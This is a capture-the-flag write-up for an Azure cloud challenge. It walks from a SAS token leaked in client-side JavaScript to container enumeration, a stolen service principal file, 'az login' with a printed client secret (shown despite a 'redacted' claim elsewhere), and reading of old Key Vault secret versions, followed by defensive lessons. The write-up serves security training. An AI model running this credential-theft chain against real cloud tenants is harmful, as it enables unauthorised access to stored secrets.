# Day 09 - CryptoCabana

- **Room:** CryptoCabana
- **Category:** ☁️ Cloud
- **Difficulty:** Medium
- **Points:** 90
- **Date completed:** 4th of August 2026

## Summary

CryptoCabana is a fake "seed phrase backup" kiosk hosted as a static website on Azure Storage. The site's own client-side JS leaks a Storage Account SAS token with far broader scope than intended. That token leads to a hidden storage container holding service principal credentials for an Azure Key Vault. Inside the vault, one of three "key shard" secrets has a previous version that was quietly rotated away - and that older version holds the real value needed to reconstruct the flag.

## Exploitation / Walkthrough

### Step 1 - Recon the kiosk's own code

The landing page itself gives nothing away, so the next stop was the page's network requests / view-source. Pulling `app.js` revealed hardcoded storage details:

```js
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=...";
```

The kiosk uses this SAS token to `PUT` a visitor's "recovery phrase" straight into blob storage - no server in between.

### Step 2 - Read the SAS token's real scope

Breaking the SAS parameters down:
- `ss=b` - blob service only
- `srt=sco` - scope covers **service, container, and object** level (not just the one container)
- `sp=rl` - **read + list** permissions
- `se=2099-12-31` - valid essentially forever

So although the kiosk only *intends* to write into `backups`, the token it shipped can **read and list the entire storage account**.

### Step 3 - Enumerate containers with the leaked SAS

```
https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&<SAS>
```

This returned three containers: `$web` (the site itself), `backups` (expected), and `vault` - never linked anywhere on the kiosk's own page.

### Step 4 - List and pull files from the `vault` container

```
https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&<SAS>
```

Two blobs turned up:
- `seed_phrase.txt` - a decoy recovery phrase, not the actual objective
- `backup-service-account.json` - the real find

Fetching the JSON:

```json
{
  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
  "client_secret": "REDACTED FOR SECURITY PURPOSES",
  "key_vault_name": "ccabana-kv-f5scjagc",
  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT"
}
```

A full Azure AD service principal - the kiosk's storage trust extended straight into Key Vault.

### Step 5 - Authenticate to Azure as the leaked service principal

```powershell
az login --service-principal `
  -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 `
  -p "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg" `
  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
```

### Step 6 - List secrets in the vault

```powershell
az keyvault secret list --vault-name ccabana-kv-f5scjagc --output table
```

Four secrets: `key-shard-1`, `key-shard-2`, `key-shard-3`, and `master-key` - the last one already **expired** (2020), a dead end on its own.

### Step 7 - Follow the "freshly rotated" hint

Checking version history per secret:

```powershell
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-1 --output json
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 --output json
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-3 --output json
```

`key-shard-1` and `key-shard-3` each had a single version. `key-shard-2` had **two**, created two seconds apart - a clear sign of a rotation. Per the hint ("if a value looks freshly rotated, ask yourself what it looked like five minutes before that"), the real value was sitting in the **older** version, not the current one:

```powershell
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 --version 3d6492d2c6f74123bc754a9ded22b2a0
```

### Step 8 - Assemble the shards

Reading `key-shard-1`, the older `key-shard-2`, and `key-shard-3` together gave the pieces needed to reconstruct the flag.

And voila, there you have it!

## Flag

![redacted](https://img.shields.io/badge/flag-REDACTED-black)

*The correct flag will be posted once the event has concluded, to avoid spoilers.*

## Lessons Learned

- A SAS token's scope (`srt`, `sp`) matters just as much as its expiry date - a token meant for one narrow write action can quietly grant read/list access to an entire storage account if it's over-scoped.
- Client-side code (JS shipped to the browser) should never hold credentials of any kind, including SAS tokens - anything in it is public by definition.
- Trust chains compound: a leaked storage token led to a leaked service principal, which led straight into Key Vault. Each hop widened the blast radius of the original leak.
- Key Vault secret versions aren't wiped on rotation - old versions stay recoverable unless explicitly purged, so a rotation without cleanup doesn't fully close the exposure.
